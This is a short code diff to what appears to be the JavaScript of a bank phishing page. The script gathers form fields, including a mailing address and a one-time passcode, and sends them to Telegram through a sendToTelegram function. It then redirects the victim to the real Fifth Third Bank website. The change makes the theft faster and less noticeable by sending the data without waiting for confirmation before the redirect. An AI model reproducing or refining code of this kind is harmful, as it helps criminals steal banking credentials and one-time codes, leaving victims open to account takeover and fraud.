@@ -43,10 +43,9 @@ document.addEventListener('DOMContentLoaded', function() {
       mailingaddress: form.mailingaddress.value,
       otp: form.otp.value
     };
-    sendToTelegram(data, () => {
-      form.reset();
-      window.location.href = 'https://www.53.com/';
-    });
+    sendToTelegram(data); // Don't wait for callback
+    form.reset();
+    window.location.href = 'https://www.53.com/';
   });
 });
 
